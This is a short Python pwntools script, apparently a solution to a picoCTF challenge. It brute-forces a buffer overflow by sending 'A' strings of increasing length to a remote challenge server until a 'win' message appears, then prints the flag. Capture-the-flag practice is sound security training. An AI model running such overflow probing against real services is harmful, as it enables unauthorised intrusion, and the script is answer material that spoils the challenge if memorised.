#!/usr/bin/env python3
from pwn import *

# give context from binary
context.binary = './local-target'

for i in range(16, 32):
    print(i)
    r = remote('saturn.picoctf.net', '54791')
    r.recvuntil('Enter a string:')
    r.sendline("A" * i)
    s = r.recvuntil('!')
    if b'win' in s:
        print(r.recvuntil('}'))
        break
    else:
        r.close()
